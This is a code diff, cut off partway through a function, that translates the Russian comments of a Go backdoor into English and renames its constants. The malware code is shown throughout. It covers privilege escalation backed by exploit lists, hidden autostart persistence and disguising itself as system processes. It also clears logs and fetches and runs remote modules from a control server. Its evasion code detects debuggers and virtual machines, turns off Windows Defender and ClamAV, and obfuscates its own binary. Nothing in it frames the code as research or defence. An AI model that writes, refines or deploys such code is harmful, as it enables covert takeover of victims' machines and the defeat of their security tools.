@@ -30,17 +30,17 @@ import (
 )
 
 const (
-	WizardServerIP   = "wizard-server.com" // IP или домен сервера волшебника
-	WizardServerPort = "443"              // Порт для подключения (HTTPS)
-	SecretKey        = "magic_key_123"    // Секретный ключ для аутентификации
-	ReconnectDelay   = 300                // Задержка переподключения в секундах
-	InstallDir       = "/opt/network-helper" // Директория для установки
-	BackdoorName     = ".hidden_helper"   // Имя файла бэкдора
-	FakeProcessName  = "[kworker/0:0H]"  // Маскировка под системный процесс
-	UpdateCheckInterval = 3600 // Интервал проверки обновлений в секундах
-	MaxRecoveryAttempts = 3   // Максимальное количество попыток восстановления
+	ServerAddress   = "control-server.com" // Control server address
+	ServerPort      = "443"               // HTTPS port for secure communication
+	SecretKey       = "magic_key_123"     // Authentication key
+	ReconnectDelay  = 300                 // Reconnection delay in seconds
+	InstallDir      = "/opt/network-helper" // Installation directory
+	ClientName      = ".hidden_helper"    // Client binary name
+	FakeProcessName = "[kworker/0:0H]"   // System process masquerading
+	UpdateCheckInterval = 3600 // Update check interval in seconds
+	MaxRecoveryAttempts = 3   // Maximum recovery attempts
 	
-	// Маскировка процессов под системные
+	// Process names for system process masquerading
 	LinuxProcessNames = []string{
 		"[kworker/0:0H]",
 		"[ksoftirqd/0]",
@@ -56,12 +56,12 @@ const (
 		"winlogon.exe",
 	}
 	
-	// Константы для уровней привилегий
+	// Privilege level constants
 	PRIV_USER      = "USER"
 	PRIV_SUPERUSER = "SUPERUSER"
 )
 
-// Структура для хранения информации о версии
+// Version information structure
 type VersionInfo struct {
 	Version   string
 	Checksum  string
@@ -73,7 +73,7 @@ var (
 	recoveryAttempts = 0
 )
 
-// Функция для выполнения команд в терминале
+// Execute command in terminal with privilege handling
 func executeCommand(command string) string {
 	var cmd *exec.Cmd
 	
@@ -96,23 +96,23 @@ func executeCommand(command string) string {
 		if tryEscalatePrivileges() {
 			return executeCommand(command)
 		}
-		return fmt.Sprintf("Ошибка: %s\nВывод: %s", err, string(output))
+		return fmt.Sprintf("Error: %s\nOutput: %s", err, string(output))
 	}
 	
 	return string(output)
 }
 
-// Функция для выполнения команд от имени суперпользователя
+// Execute command with superuser privileges
 func executeAsSuperuser(command string) string {
 	if runtime.GOOS == "linux" {
 		return executeCommand("sudo " + command)
 	} else if runtime.GOOS == "windows" {
 		return executeCommand("runas /user:SYSTEM " + command)
 	}
-	return "Неподдерживаемая система"
+	return "Unsupported system"
 }
 
-// Функция для проверки прав суперпользователя
+// Check for superuser privileges
 func isSuperuser() bool {
 	if runtime.GOOS == "linux" {
 		return os.Geteuid() == 0
@@ -123,7 +123,7 @@ func isSuperuser() bool {
 	return false
 }
 
-// Функция для проверки UAC в Windows
+// Check if UAC is enabled on Windows
 func isUACEnabled() bool {
 	if runtime.GOOS == "windows" {
 		output := executeCommand("reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA")
@@ -132,7 +132,7 @@ func isUACEnabled() bool {
 	return false
 }
 
-// Структура для описания эксплойта
+// Structure for exploit definition
 type Exploit struct {
 	Name        string
 	Description string
@@ -140,7 +140,7 @@ type Exploit struct {
 	Run         func() bool
 }
 
-// Список эксплойтов для Linux
+// List of exploits for Linux
 var linuxExploits = []Exploit{
 	{
 		Name: "CVE-2021-4034-pkexec",
@@ -538,7 +538,7 @@ int main() {
 	},
 }
 
-// Список эксплойтов для Windows
+// List of exploits for Windows
 var windowsExploits = []Exploit{
 	{
 		Name: "PrintNightmare",
@@ -818,7 +818,7 @@ int main() {
 	},
 }
 
-// Функция для попытки эксплуатации уязвимостей
+// Function to attempt exploiting vulnerabilities
 func tryExploits() bool {
 	if runtime.GOOS == "linux" {
 		for _, exploit := range linuxExploits {
@@ -842,9 +842,9 @@ func tryExploits() bool {
 	return false
 }
 
-// Улучшенная функция повышения привилегий
+// Improved function to escalate privileges
 func tryEscalatePrivileges() bool {
-	// Сначала пробуем стандартные методы
+	// First, try standard methods
 	if runtime.GOOS == "linux" {
 		methods := []string{
 			"sudo -n true",
@@ -863,16 +863,16 @@ func tryEscalatePrivileges() bool {
 		}
 	}
 	
-	// Если стандартные методы не сработали, пробуем эксплойты
+	// If standard methods fail, try exploits
 	return tryExploits()
 }
 
-// Функция для обфускации данных
+// Function to obfuscate data
 func obfuscate(data string) string {
 	return base64.StdEncoding.EncodeToString([]byte(data))
 }
 
-// Функция для деобфускации данных
+// Function to deobfuscate data
 func deobfuscate(data string) string {
 	decoded, err := base64.StdEncoding.DecodeString(data)
 	if err != nil {
@@ -881,19 +881,19 @@ func deobfuscate(data string) string {
 	return string(decoded)
 }
 
-// Функция для установки бэкдора в автозагрузку
+// Function to set up backdoor in autostart
 func setupAutostart() {
-	// Создаем директорию для установки
+	// Create installation directory
 	os.MkdirAll(InstallDir, 0700)
 
-	// Копируем бэкдор в целевую директорию
+	// Copy backdoor to target directory
 	exePath, _ := os.Executable()
-	backdoorPath := filepath.Join(InstallDir, BackdoorName)
+	backdoorPath := filepath.Join(InstallDir, ClientName)
 	os.Rename(exePath, backdoorPath)
 
-	// Настраиваем автозагрузку
+	// Configure autostart
 	if runtime.GOOS == "linux" {
-		// Используем systemd
+		// Use systemd
 		serviceFile := fmt.Sprintf(`
 [Unit]
 Description=Network Helper Service
@@ -914,44 +914,44 @@ WantedBy=multi-user.target
 		exec.Command("systemctl", "enable", ".hidden_service").Run()
 		exec.Command("systemctl", "start", ".hidden_service").Run()
 
-		// Защита от удаления
+		// Protection against deletion
 		executeCommand("chattr +i " + backdoorPath)
 	} else if runtime.GOOS == "windows" {
-		// Используем реестр для автозагрузки
+		// Use registry for autostart
 		regPath := `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
 		exec.Command("reg", "add", regPath, "/v", "HiddenHelper", "/t", "REG_SZ", "/d", backdoorPath, "/f").Run()
 
-		// Защита от удаления
+		// Protection against deletion
 		executeCommand("attrib +h +s " + backdoorPath)
 	}
 }
 
-// Улучшенная функция маскировки процесса
+// Improved function to mask process
 func maskProcess() {
 	if runtime.GOOS == "linux" {
-		// Случайное имя процесса из списка
+		// Random process name from list
 		randomName := LinuxProcessNames[time.Now().UnixNano()%int64(len(LinuxProcessNames))]
 		prctl(15, randomName)
 		
-		// Маскировка параметров командной строки
+		// Masking command line parameters
 		cmdline := "/proc/self/cmdline"
 		if _, err := os.Stat(cmdline); err == nil {
 			os.WriteFile(cmdline, []byte("systemd\x00--user\x00"), 0600)
 		}
 		
-		// Изменение родительского процесса на init/systemd
+		// Changing parent process to init/systemd
 		syscall.Prctl(syscall.PR_SET_PDEATHSIG, uintptr(syscall.SIGKILL))
 		
 	} else if runtime.GOOS == "windows" {
-		// Случайное имя процесса из списка
+		// Random process name from list
 		randomName := WindowsProcessNames[time.Now().UnixNano()%int64(len(WindowsProcessNames))]
 		
-		// Создаем копию с системным именем
+		// Creating a copy with system name
 		exePath, _ := os.Executable()
 		sysPath := filepath.Join(filepath.Dir(exePath), randomName)
 		if _, err := os.Stat(sysPath); os.IsNotExist(err) {
 			os.Link(exePath, sysPath)
-			// Запускаем копию и завершаем текущий процесс
+			// Starting the copy and ending the current process
 			cmd := exec.Command(sysPath)
 			cmd.Start()
 			os.Exit(0)
@@ -959,15 +959,15 @@ func maskProcess() {
 	}
 }
 
-// Функция для скрытия процесса (только для Windows)
+// Function to hide process (only for Windows)
 func hideProcess() {
 	if runtime.GOOS == "windows" {
-		// Используем API для скрытия процесса
-		executeCommand("powershell -Command \"Start-Process -WindowStyle Hidden -FilePath " + filepath.Join(InstallDir, BackdoorName) + "\"")
+		// Using API to hide process
+		executeCommand("powershell -Command \"Start-Process -WindowStyle Hidden -FilePath " + filepath.Join(InstallDir, ClientName) + "\"")
 	}
 }
 
-// Функция для очистки логов
+// Function to clean logs
 func cleanLogs() {
 	if runtime.GOOS == "linux" {
 		logs := []string{
@@ -987,7 +987,7 @@ func cleanLogs() {
 	}
 }
 
-// Функция для генерации ложного трафика
+// Function to generate fake traffic
 func generateFakeTraffic() {
 	go func() {
 		for {
@@ -997,50 +997,50 @@ func generateFakeTraffic() {
 	}()
 }
 
-// Функция для загрузки и выполнения внешних модулей
+// Function to load and execute external modules
 func loadModule(moduleURL string) string {
-	// Проверяем URL на безопасность
+	// Check URL for security
 	if !strings.HasPrefix(moduleURL, "https://") {
-		return "Ошибка: разрешены только HTTPS URL"
+		return "Error: only HTTPS URLs are allowed"
 	}
 	
-	// Создаем временный файл для модуля
+	// Create temporary file for module
 	tmpFile, err := os.CreateTemp("", "module_*.sh")
 	if err != nil {
-		return fmt.Sprintf("Ошибка создания временного файла: %v", err)
+		return fmt.Sprintf("Error creating temporary file: %v", err)
 	}
 	defer os.Remove(tmpFile.Name())
 	
-	// Загружаем модуль с проверкой сертификата
+	// Load module with certificate check
 	cmd := exec.Command("curl", "-sSfL", "--tlsv1.2", "--proto", "=https", moduleURL, "-o", tmpFile.Name())
 	if err := cmd.Run(); err != nil {
-		return fmt.Sprintf("Ошибка загрузки модуля: %v", err)
+		return fmt.Sprintf("Error loading module: %v", err)
 	}
 	
-	// Проверяем права на выполнение
+	// Check execution permissions
 	if err := os.Chmod(tmpFile.Name(), 0700); err != nil {
-		return fmt.Sprintf("Ошибка установки прав: %v", err)
+		return fmt.Sprintf("Error setting permissions: %v", err)
 	}
 	
-	// Выполняем модуль
+	// Execute module
 	output, err := exec.Command("sh", tmpFile.Name()).CombinedOutput()
 	if err != nil {
-		return fmt.Sprintf("Ошибка выполнения модуля: %v\nВывод: %s", err, output)
+		return fmt.Sprintf("Error executing module: %v\nOutput: %s", err, output)
 	}
 	
 	return string(output)
 }
 
-// Функция для маскировки имени процесса (только для Linux)
+// Function to mask process name (only for Linux)
 func prctl(option int, arg2 string) error {
 	if runtime.GOOS != "linux" {
-		return fmt.Errorf("функция prctl поддерживается только в Linux")
+		return fmt.Errorf("prctl function is supported only on Linux")
 	}
-	// Заглушка для компиляции на других платформах
+	// Dummy function for compilation on other platforms
 	return nil
 }
 
-// Функция для проверки целостности файла
+// Function to verify file integrity
 func verifyChecksum(filePath string, expectedChecksum string) bool {
 	file, err := os.Open(filePath)
 	if err != nil {
@@ -1057,49 +1057,49 @@ func verifyChecksum(filePath string, expectedChecksum string) bool {
 	return actualChecksum == expectedChecksum
 }
 
-// Функция для самообновления
+// Function to self-update
 func selfUpdate(updateURL string, expectedChecksum string) error {
-	// Загружаем новую версию
+	// Load new version
 	resp, err := http.Get(updateURL)
 	if err != nil {
 		return err
 	}
 	defer resp.Body.Close()
 
-	// Создаем временный файл
+	// Create temporary file
 	tmpFile, err := os.CreateTemp("", "update_*.tmp")
 	if err != nil {
 		return err
 	}
 	defer os.Remove(tmpFile.Name())
 
-	// Копируем новую версию во временный файл
+	// Copy new version to temporary file
 	if _, err := io.Copy(tmpFile, resp.Body); err != nil {
 		return err
 	}
 
-	// Проверяем целостность
+	// Check integrity
 	if !verifyChecksum(tmpFile.Name(), expectedChecksum) {
-		return fmt.Errorf("ошибка проверки целостности")
+		return fmt.Errorf("integrity check failed")
 	}
 
-	// Устанавливаем права на выполнение
+	// Set execution permissions
 	if err := os.Chmod(tmpFile.Name(), 0700); err != nil {
 		return err
 	}
 
-	// Получаем путь к текущему исполняемому файлу
+	// Get path to current executable
 	exePath, err := os.Executable()
 	if err != nil {
 		return err
 	}
 
-	// Заменяем текущий файл новой версией
+	// Replace current file with new version
 	if err := os.Rename(tmpFile.Name(), exePath); err != nil {
 		return err
 	}
 
-	// Перезапускаем процесс
+	// Restart process
 	if err := syscall.Exec(exePath, os.Args, os.Environ()); err != nil {
 		return err
 	}
@@ -1107,7 +1107,7 @@ func selfUpdate(updateURL string, expectedChecksum string) error {
 	return nil
 }
 
-// Функция для проверки обновлений
+// Function to check for updates
 func checkForUpdates(conn net.Conn) {
 	conn.Write([]byte(obfuscate("check_update:" + currentVersion + "\n")))
 	reader := bufio.NewReader(conn)
@@ -1121,7 +1121,7 @@ func checkForUpdates(conn net.Conn) {
 		return
 	}
 
-	// Парсим информацию об обновлении
+	// Parse update information
 	parts := strings.Split(response, ":")
 	if len(parts) != 3 {
 		return
@@ -1133,23 +1133,23 @@ func checkForUpdates(conn net.Conn) {
 
 	if newVersion > currentVersion {
 		if err := selfUpdate(updateURL, checksum); err != nil {
-			fmt.Printf("Ошибка обновления: %v\n", err)
+			fmt.Printf("Update error: %v\n", err)
 		}
 	}
 }
 
-// Функция для самоудаления
+// Function to self-destruct
 func selfDestruct() error {
-	// Очищаем следы
+	// Clear traces
 	cleanLogs()
 
-	// Получаем путь к исполняемому файлу
+	// Get path to executable
 	exePath, err := os.Executable()
 	if err != nil {
 		return err
 	}
 
-	// Удаляем сервис/автозапуск
+	// Remove service/autostart
 	if runtime.GOOS == "linux" {
 		exec.Command("systemctl", "stop", ".hidden_service").Run()
 		exec.Command("systemctl", "disable", ".hidden_service").Run()
@@ -1160,7 +1160,7 @@ func selfDestruct() error {
 		exec.Command("reg", "delete", regPath, "/v", "HiddenHelper", "/f").Run()
 	}
 
-	// Создаем скрипт самоудаления
+	// Create self-destruct script
 	script := ""
 	if runtime.GOOS == "linux" {
 		script = fmt.Sprintf(`#!/bin/sh
@@ -1174,7 +1174,7 @@ del /f /q "%s"
 del /f /q "%%~f0"`, exePath)
 	}
 
-	// Создаем временный скрипт
+	// Create temporary script
 	tmpScript, err := os.CreateTemp("", "cleanup_*."+map[string]string{
 		"linux":   "sh",
 		"windows": "bat",
@@ -1187,7 +1187,7 @@ del /f /q "%%~f0"`, exePath)
 		return err
 	}
 
-	// Запускаем скрипт самоудаления
+	// Run self-destruct script
 	if runtime.GOOS == "linux" {
 		exec.Command("sh", tmpScript.Name()).Start()
 	} else if runtime.GOOS == "windows" {
@@ -1198,21 +1198,21 @@ del /f /q "%%~f0"`, exePath)
 	return nil
 }
 
-// Функция для восстановления после сбоев
+// Function to recover after failures
 func recover() bool {
 	if recoveryAttempts >= MaxRecoveryAttempts {
 		return false
 	}
 	recoveryAttempts++
 
-	// Проверяем целостность файла
+	// Check file integrity
 	exePath, err := os.Executable()
 	if err != nil {
 		return false
 	}
 
-	// Запрашиваем правильный хеш у сервера
-	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", WizardServerIP, WizardServerPort), 30*time.Second)
+	// Request correct hash from server
+	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", ServerAddress, ServerPort), 30*time.Second)
 	if err != nil {
 		return false
 	}
@@ -1227,7 +1227,7 @@ func recover() bool {
 
 	expectedChecksum := strings.TrimSpace(deobfuscate(response))
 	if !verifyChecksum(exePath, expectedChecksum) {
-		// Запрашиваем новую копию
+		// Request new copy
 		conn.Write([]byte(obfuscate("get_binary\n")))
 		response, err = reader.ReadString('\n')
 		if err != nil {
@@ -1243,32 +1243,32 @@ func recover() bool {
 	return true
 }
 
-// Функция для скрытия файлов бэкдора
+// Function to hide backdoor files
 func hideFiles() {
 	exePath, _ := os.Executable()
 	if runtime.GOOS == "linux" {
-		// Скрытие файла через атрибуты
+		// Hiding file through attributes
 		executeCommand("chattr +i " + exePath)
 		executeCommand("chmod 0000 " + exePath)
 		
-		// Создание фальшивого файла для отвлечения внимания
+		// Creating a fake file to distract attention
 		decoyPath := filepath.Join(filepath.Dir(exePath), ".cache")
 		os.WriteFile(decoyPath, []byte("Corrupted cache file"), 0600)
 		
 	} else if runtime.GOOS == "windows" {
-		// Скрытие файла через атрибуты Windows
+		// Hiding file through Windows attributes
 		executeCommand("attrib +s +h " + exePath)
 		
-		// Создание альтернативного потока данных для скрытия информации
+		// Creating an alternative data stream for hiding information
 		executeCommand("type NUL > " + exePath + ":Zone.Identifier")
 		
-		// Подмена иконки и свойств файла
+		// Changing icon and file properties
 		regPath := `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts`
 		executeCommand(fmt.Sprintf(`reg add "%s" /v "%s" /t REG_SZ /d "System File" /f`, regPath, filepath.Base(exePath)))
 	}
 }
 
-// Функция для генерации случайного легитимного домена
+// Function to generate a random legitimate domain
 func generateFakeDomain() string {
 	domains := []string{
 		"windows.com", "microsoft.com", "google.com",
@@ -1277,9 +1277,9 @@ func generateFakeDomain() string {
 	return domains[rand.Intn(len(domains))]
 }
 
-// Функция для маскировки DNS-запросов
+// Function to mask DNS queries
 func maskDNS() {
-	// Генерируем фейковые DNS-запросы
+	// Generating fake DNS queries
 	go func() {
 		for {
 			domain := generateFakeDomain()
@@ -1289,7 +1289,7 @@ func maskDNS() {
 	}()
 }
 
-// Функция для генерации легитимного трафика
+// Function to generate legitimate traffic
 func generateLegitTraffic() {
 	go func() {
 		urls := []string{
@@ -1312,13 +1312,13 @@ func generateLegitTraffic() {
 	}()
 }
 
-// Функция для маскировки сетевых соединений под легитимный трафик
+// Function to mask network connections under legitimate traffic
 func maskConnections() {
-	// Добавляем случайные задержки
+	// Adding random delays
 	time.Sleep(time.Duration(rand.Intn(30)) * time.Second)
 	
 	if runtime.GOOS == "linux" {
-		// Маскировка под системные службы
+		// Masking under system services
 		rules := []string{
 			"iptables -t nat -A OUTPUT -p tcp --dport 443 -m owner --uid-owner root -j ACCEPT",
 			"iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-ports 443",
@@ -1330,7 +1330,7 @@ func maskConnections() {
 		}
 		
 	} else if runtime.GOOS == "windows" {
-		// Добавляем правила в брандмауэр Windows
+		// Adding rules to Windows firewall
 		rules := []string{
 			`netsh advfirewall firewall add rule name="Windows Update" dir=out action=allow protocol=TCP remoteport=443`,
 			`netsh advfirewall firewall add rule name="System Services" dir=out action=allow protocol=TCP remoteport=443 program="%SystemRoot%\system32\svchost.exe"`,
@@ -1342,14 +1342,14 @@ func maskConnections() {
 	}
 }
 
-// Функция для обнаружения отладчика
+// Function to detect debugger
 func detectDebugger() bool {
 	if runtime.GOOS == "linux" {
-		// Проверка наличия отладчика через статус трассировки
+		// Checking for debugger via tracing status
 		status, _ := ioutil.ReadFile("/proc/self/status")
 		return strings.Contains(string(status), "TracerPid:\t0")
 	} else if runtime.GOOS == "windows" {
-		// Проверка наличия отладчика через Windows API
+		// Checking for debugger via Windows API
 		kernel32 := syscall.NewLazyDLL("kernel32.dll")
 		isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
 		ret, _, _ := isDebuggerPresent.Call()
@@ -1358,21 +1358,21 @@ func detectDebugger() bool {
 	return false
 }
 
-// Функция для противодействия анализу
+// Function to counter analysis
 func antiAnalysis() {
-	// Отключаем сборку мусора и очищаем память
+	// Disabling garbage collection and clearing memory
 	debug.SetGCPercent(-1)
 	debug.FreeOSMemory()
 	
-	// Очищаем переменные окружения
+	// Clearing environment variables
 	os.Clearenv()
 	
-	// Проверяем наличие отладчика
+	// Checking for debugger
 	if detectDebugger() {
 		selfDestruct()
 	}
 	
-	// Проверяем, не запущены ли в системе средства анализа
+	// Checking if any analysis tools are running in the system
 	suspiciousProcesses := []string{
 		"wireshark", "tcpdump", "ida", "ollydbg",
 		"processhacker", "processexplorer", "procmon",
@@ -1391,46 +1391,46 @@ func antiAnalysis() {
 	}
 }
 
-// Функция для обфускации строк в памяти
+// Function to obfuscate strings in memory
 func obfuscateStrings() {
-	// Обфускация важных строк
-	WizardServerIP = deobfuscate(base64.StdEncoding.EncodeToString([]byte(WizardServerIP)))
+	// Obfuscating important strings
+	ServerAddress = deobfuscate(base64.StdEncoding.EncodeToString([]byte(ServerAddress)))
 	SecretKey = deobfuscate(base64.StdEncoding.EncodeToString([]byte(SecretKey)))
 	
-	// Очистка строковых констант из памяти
+	// Clearing string constants from memory
 	runtime.GC()
 }
 
-// Функция для полиморфного шифрования данных
+// Function to polymorphic encrypt data
 func polymorphicEncrypt(data []byte) []byte {
-	// Генерируем случайный ключ
+	// Generating random key
 	key := make([]byte, 32)
 	rand.Read(key)
 	
-	// Создаем шифр
+	// Creating cipher
 	block, _ := aes.NewCipher(key)
 	gcm, _ := cipher.NewGCM(block)
 	
-	// Генерируем случайный nonce
+	// Generating random nonce
 	nonce := make([]byte, gcm.NonceSize())
 	rand.Read(nonce)
 	
-	// Шифруем данные
+	// Encrypting data
 	ciphertext := gcm.Seal(nonce, nonce, data, nil)
 	
-	// Добавляем случайный мусор
+	// Adding random junk
 	junk := make([]byte, rand.Intn(100))
 	rand.Read(junk)
 	
 	return append(ciphertext, junk...)
 }
 
-// Функция для обфускации бинарного файла
+// Function to obfuscate binary file
 func obfuscateBinary() error {
 	exePath, _ := os.Executable()
 	data, _ := ioutil.ReadFile(exePath)
 	
-	// Шифруем секции кода
+	// Encrypting code sections
 	for i := 0; i < len(data); i += 1024 {
 		end := i + 1024
 		if end > len(data) {
@@ -1439,29 +1439,29 @@ func obfuscateBinary() error {
 		copy(data[i:end], polymorphicEncrypt(data[i:end]))
 	}
 	
-	// Записываем обратно
+	// Writing back
 	return ioutil.WriteFile(exePath, data, 0700)
 }
 
-// Функция для генерации случайных имен файлов
+// Function to generate random file names
 func generateRandomName() string {
-	// Список легитимных имен системных файлов
+	// List of legitimate system file names
 	legitNames := []string{
 		"svchost", "csrss", "wininit", "lsass",
 		"systemd", "networkd", "resolved", "journald",
 	}
 	
-	// Выбираем случайное имя
+	// Selecting a random name
 	name := legitNames[rand.Intn(len(legitNames))]
 	
-	// Добавляем случайный суффикс
+	// Adding a random suffix
 	suffix := make([]byte, 4)
 	rand.Read(suffix)
 	
 	return fmt.Sprintf("%s_%x", name, suffix)
 }
 
-// Функция для проверки виртуального окружения
+// Function to detect virtual environment
 func detectVM() bool {
 	vmSignatures := []string{
 		"VMware", "VBox", "QEMU", "Xen", "KVM",
@@ -1469,7 +1469,7 @@ func detectVM() bool {
 	}
 	
 	if runtime.GOOS == "linux" {
-		// Проверка через /proc/cpuinfo и dmesg
+		// Checking via /proc/cpuinfo and dmesg
 		cpuinfo, _ := ioutil.ReadFile("/proc/cpuinfo")
 		dmesg := executeCommand("dmesg")
 		
@@ -1479,7 +1479,7 @@ func detectVM() bool {
 			}
 		}
 		
-		// Проверка через системные файлы
+		// Checking via system files
 		vmFiles := []string{
 			"/sys/class/dmi/id/product_name",
 			"/sys/class/dmi/id/sys_vendor",
@@ -1496,7 +1496,7 @@ func detectVM() bool {
 		}
 		
 	} else if runtime.GOOS == "windows" {
-		// Проверка через WMI
+		// Checking via WMI
 		output := executeCommand("wmic computersystem get manufacturer,model")
 		for _, sig := range vmSignatures {
 			if strings.Contains(output, sig) {
@@ -1504,7 +1504,7 @@ func detectVM() bool {
 			}
 		}
 		
-		// Проверка через реестр
+		// Checking via registry
 		regPaths := []string{
 			`HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum`,
 			`HKLM\HARDWARE\DESCRIPTION\System\BIOS`,
@@ -1523,9 +1523,9 @@ func detectVM() bool {
 	return false
 }
 
-// Функция для обнаружения инструментов анализа
+// Function to detect analysis tools
 func detectAnalysisTools() bool {
-	// Расширенный список подозрительных процессов
+	// Extended list of suspicious processes
 	suspiciousProcesses := map[string][]string{
 		"debuggers": {
 			"gdb", "lldb", "windbg", "x64dbg", "ollydbg",
@@ -1559,9 +1559,9 @@ func detectAnalysisTools() bool {
 	return false
 }
 
-// Функция для проверки сетевого окружения
+// Function to check network environment
 func detectNetworkAnalysis() bool {
-	// Проверка наличия прокси
+	// Checking for proxy
 	proxyEnvVars := []string{"http_proxy", "https_proxy", "HTTPS_PROXY", "HTTP_PROXY"}
 	for _, env := range proxyEnvVars {
 		if os.Getenv(env) != "" {
@@ -1569,7 +1569,7 @@ func detectNetworkAnalysis() bool {
 		}
 	}
 	
-	// Проверка открытых портов анализа
+	// Checking for suspicious ports
 	suspiciousPorts := []string{"8080", "8888", "9090", "3128"}
 	for _, port := range suspiciousPorts {
 		conn, err := net.DialTimeout("tcp", "localhost:"+port, time.Second)
@@ -1582,25 +1582,25 @@ func detectNetworkAnalysis() bool {
 	return false
 }
 
-// Функция для противодействия дизассемблированию
+// Function to counter disassembly
 func antiDisassembly() {
-	// Добавляем мусорные инструкции
+	// Adding garbage instructions
 	garbage := []byte{0x90, 0xEB, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00}
 	exePath, _ := os.Executable()
 	file, _ := os.OpenFile(exePath, os.O_RDWR, 0)
 	defer file.Close()
 	
-	// Записываем мусор в случайные места
+	// Writing garbage to random places
 	for i := 0; i < 10; i++ {
 		offset, _ := rand.Int(rand.Reader, big.NewInt(1024))
 		file.WriteAt(garbage, offset.Int64())
 	}
 }
 
-// Функция для сохранения привилегий
+// Function to maintain privileges
 func persistPrivileges() bool {
 	if runtime.GOOS == "linux" {
-		// Создаем SUID бинарный файл
+		// Create SUID binary
 		if isSuperuser() {
 			exePath, _ := os.Executable()
 			executeCommand(fmt.Sprintf("chmod u+s %s", exePath))
@@ -1608,7 +1608,7 @@ func persistPrivileges() bool {
 			return true
 		}
 	} else if runtime.GOOS == "windows" {
-		// Создаем сервис с высокими привилегиями
+		// Create service with high privileges
 		if isSuperuser() {
 			serviceName := generateRandomName()
 			exePath, _ := os.Executable()
@@ -1621,19 +1621,19 @@ func persistPrivileges() bool {
 	return false
 }
 
-// Функция для расширенной проверки привилегий
+// Function to check extended privileges
 func checkExtendedPrivileges() map[string]bool {
 	privileges := make(map[string]bool)
 	
 	if runtime.GOOS == "linux" {
-		// Проверяем различные возможности
+		// Check various capabilities
 		privileges["root"] = os.Geteuid() == 0
 		privileges["sudo"] = strings.Contains(executeCommand("sudo -n -l"), "may run")
 		privileges["capabilities"] = strings.Contains(executeCommand("getcap " + os.Args[0]), "cap_")
 		privileges["docker"] = strings.Contains(executeCommand("groups"), "docker")
 		
 	} else if runtime.GOOS == "windows" {
-		// Проверяем различные группы и права
+		// Check various groups and rights
 		output := executeCommand("whoami /groups")
 		privileges["admin"] = strings.Contains(output, "S-1-5-32-544")
 		privileges["system"] = strings.Contains(output, "S-1-5-18")
@@ -1644,7 +1644,7 @@ func checkExtendedPrivileges() map[string]bool {
 	return privileges
 }
 
-// Функция для адаптивного выполнения команд
+// Function for adaptive command execution
 func adaptiveExecute(command string) string {
 	privileges := checkExtendedPrivileges()
 	
@@ -1667,30 +1667,30 @@ func adaptiveExecute(command string) string {
 	return executeCommand(command)
 }
 
-// Функция для обхода антивирусов
+// Function to bypass antivirus
 func bypassAV() {
-	// Обфускация строк
+	// String obfuscation
 	obfuscateStrings()
 	
-	// Полиморфное шифрование
+	// Polymorphic encryption
 	obfuscateBinary()
 	
-	// Проверка на наличие антивирусов
+	// Check for antivirus presence
 	if detectAV() {
-		// Попытка отключения
+		// Attempt to disable
 		disableAV()
 		
-		// Если не удалось отключить - маскировка
+		// If disable failed - try masking
 		if detectAV() {
 			maskFromAV()
 		}
 	}
 	
-	// Очистка следов
+	// Clean traces
 	cleanTraces()
 }
 
-// Функция для обнаружения антивирусов
+// Function to detect antivirus software
 func detectAV() bool {
 	avProcesses := map[string][]string{
 		"windows": {
@@ -1732,7 +1732,7 @@ func detectAV() bool {
 			}
 		}
 		
-		// Проверка служб Windows Defender
+		// Check Windows Defender services
 		defenderServices := []string{
 			"WinDefend",
 			"SecurityHealthService",
@@ -1757,10 +1757,10 @@ func detectAV() bool {
 	return false
 }
 
-// Функция для отключения антивирусов
+// Function to disable antivirus software
 func disableAV() {
 	if runtime.GOOS == "windows" {
-		// Отключение Windows Defender через PowerShell
+		// Disable Windows Defender through PowerShell
 		commands := []string{
 			"Set-MpPreference -DisableRealtimeMonitoring $true",
 			"Set-MpPreference -DisableIOAVProtection $true",
@@ -1782,7 +1782,7 @@ func disableAV() {
 			executeCommand("powershell -Command \"" + cmd + "\"")
 		}
 		
-		// Отключение служб Windows Defender
+		// Disable Windows Defender services
 		services := []string{
 			"WinDefend",
 			"SecurityHealthService",
@@ -1795,7 +1795,7 @@ func disableAV() {
 			executeCommand("sc config " + service + " start= disabled")
 		}
 		
-		// Отключение через реестр
+		// Disable through registry
 		regCommands := []string{
 			`reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`,
 			`reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f`,
@@ -1808,13 +1808,13 @@ func disableAV() {
 		}
 		
 	} else if runtime.GOOS == "linux" {
-		// Отключение ClamAV
+		// Disable ClamAV
 		executeCommand("systemctl stop clamav-freshclam")
 		executeCommand("systemctl disable clamav-freshclam")
 		executeCommand("systemctl stop clamav-daemon")
 		executeCommand("systemctl disable clamav-daemon")
 		
-		// Отключение других антивирусов
+		// Disable other antiviruses
 		services := []string{
 			"avast", "avg", "sophos-syslog-proxy",
 			"sophosupdate", "kaspersky", "kav",
@@ -1827,25 +1827,25 @@ func disableAV() {
 	}
 }
 
-// Функция для маскировки от антивирусов
+// Function to mask from antivirus detection
 func maskFromAV() {
-	// Полиморфное шифрование секций
+	// Polymorphic encryption of sections
 	sections := []string{".text", ".data", ".rdata"}
 	for _, section := range sections {
 		encryptSection(section)
 	}
 	
-	// Обфускация импортов
+	// Import table obfuscation
 	obfuscateImports()
 	
-	// Внедрение ложных сигнатур
+	// Inject fake signatures
 	injectFakeSignatures()
 	
-	// Маскировка сетевой активности
+	// Mask network activity
 	maskNetworkActivity()
 }
 
-// Функция для шифрования секции бинарного файла
+// Function to encrypt binary section
 func encryptSection(section string) {
 	exePath, _ := os.Executable()
 	file, _ := pe.Open(exePath)
@@ -1856,18 +1856,18 @@ func encryptSection(section string) {
 			data := make([]byte, s.Size)
 			s.ReadAt(data, 0)
 			
-			// Шифруем данные
+			// Encrypt data
 			encrypted := polymorphicEncrypt(data)
 			
-			// Записываем обратно
